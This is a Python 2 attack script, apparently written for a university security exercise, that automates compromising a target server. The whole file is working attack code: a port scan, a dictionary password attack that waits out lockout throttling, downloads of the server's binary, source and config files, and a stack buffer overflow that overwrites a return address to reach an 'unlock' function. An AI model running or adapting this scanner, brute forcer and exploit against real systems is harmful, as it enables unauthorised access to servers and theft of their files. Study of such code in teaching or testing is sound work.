#!/usr/bin/env python

# File: auto.py
# Author: Cesar Neri <ceneri@ucsc.edu>
# Date Created: February 16, 2018
#
# Simple shell script that automates server smashing by calling different Python scripts
#
# Usage: $ ./automate.sh [ip address] [skeleton key] [user] [dictionary]
# -----------------------------------------------------------------------------



import socket
import errno
import requests
import getpass
import sys
import telnetlib
import time
import re
from struct import *


def get_file_input_as_list(filePath):
    data = []

    file = open(filePath, "r")

    for line in file:
        data.append(line[:-1])

    file.close()
    return data

#https://pythongeekstuff.wordpress.com/2015/07/29/file-transfer-server-using-socket/
def download_file(filename, address, port, skey, username, passwd):

    #Remove file extension
    command = filename.split(".")[0]

    sockt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sockt.connect((address, port ))

    sData = "Temp"
     
    while True:
        sockt.send(skey)
        sData = sockt.recv(1024)
        sockt.send(username)
        sData = sockt.recv(1024)
        sockt.send(passwd)
        sData = sockt.recv(1024)
        sockt.send(command)
        fDownloadFile = open(filename,"wb")
        while sData:
            sData = sockt.recv(1024)
            fDownloadFile.write(sData)            
        print "Download Completed (", command, ")"
        break
     
    sockt.close()
    fDownloadFile.close()

def main():

    #Inputs
    IP_ADDRESS = sys.argv[1]
    SKELETON_KEY = sys.argv[2]
    USERNAME = sys.argv[3]
    DICTIONARY_FILE = sys.argv[4]
    

    MIN_PORT = 5000
    MAX_PORT = 65000


    #-------------------------Find all open ports in the IP ADDRESS----------------------------
    print "Finding all open ports..."

    openPorts = []
    for port in range(MIN_PORT, MAX_PORT):

        try:

            clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            clientsocket.connect((IP_ADDRESS, port))
            isOpen = clientsocket.send('\n')

            if isOpen == 1: 
                openPorts.append(port)

            clientsocket.close()

        except socket.error, v:
            continue

    
    #-----------------------------Find personal server----------------------------------------
    print "Finding personal port..."

    P_PORT = None

    #dont wait to long on evil ports
    socket.setdefaulttimeout(3)

    for port in openPorts:

        try : 
            clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            clientsocket.connect((IP_ADDRESS, port))
            clientsocket.send(SKELETON_KEY)
            sData = clientsocket.recv(1024)
            clientsocket.send(USERNAME)
            sData = clientsocket.recv(1024)

            match = re.search("Pass", sData)

            #Port found 
            if match:
                P_PORT = port
                break

            #Try next port
            else:
                clientsocket.close()
                continue

        except socket.timeout:
            continue

    if P_PORT != None:
        print "Personal port found:", P_PORT
        clientsocket.close()
    else:
        print "Personal port not found."
        quit()


    #------------------------------Find password-------------------------------------------
    print "Performing dictionary attack"

    #Get dictionary input from txt file
    dictionary = get_file_input_as_list(DICTIONARY_FILE)    

    #Test every possible password in dictionary
    PASSWORD = ''
    for pwd in dictionary:

        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clientsocket.connect((IP_ADDRESS, P_PORT))
        clientsocket.send(SKELETON_KEY)
        sData = clientsocket.recv(1024)
        clientsocket.send(USERNAME)
        sData = clientsocket.recv(1024)

        tooMany = re.search("Too many", sData)

        #Too many attempts
        if tooMany:
            bl_start = sData.find("next ") + 5
            bl_end = sData.find("seconds,") - 1
            blackout = int(sData[bl_start:bl_end])

            #Sleep
            print pwd, "could not be tested because of too many attempts. Sleeping", blackout, "seconds"
            time.sleep(blackout + 5)
            
            #Attempt conection again after sleep
            clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            clientsocket.connect((IP_ADDRESS, P_PORT))
            clientsocket.send(SKELETON_KEY)
            sData = clientsocket.recv(1024)
            clientsocket.send(USERNAME)
            sData = clientsocket.recv(1024)

        #Try next password
        clientsocket.send(pwd)
        sData = clientsocket.recv(1024)

        match = re.search('Command', sData)
    
        #Password found if response matches 'Command'
        if match:
            PASSWORD = pwd
            print "Password found:", pwd
            clientsocket.close()
            break
        
        #Otherwise go to next password
        else:
            print "Not a password:", pwd
            continue

    #------------------------------Download Binaries-------------------------------------------

    print "Downloading server files..."

    BINARY = "binary.bin"
    SOURCE = "source.c"
    CONFIG = "config"


    download_file(BINARY, IP_ADDRESS, P_PORT, SKELETON_KEY, USERNAME, PASSWORD)
    download_file(SOURCE, IP_ADDRESS, P_PORT, SKELETON_KEY, USERNAME, PASSWORD)
    download_file(CONFIG, IP_ADDRESS, P_PORT, SKELETON_KEY, USERNAME, PASSWORD)

    #------------------------------Smash Server-------------------------------------------

    print "Smashing the stack..."

    #function address
    UNLOCK_ADDRESS = 0x401379
    OFFSET = 1048

    overflow = ""
    overflow += "A"*OFFSET
    overflow += pack("<Q", UNLOCK_ADDRESS)

    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientsocket.connect((IP_ADDRESS, P_PORT ))
     
    clientsocket.send(overflow)
    sData = clientsocket.recv(1024)

    clientsocket.close()

    print "Server unlocked!"

if __name__ == '__main__':
    main()

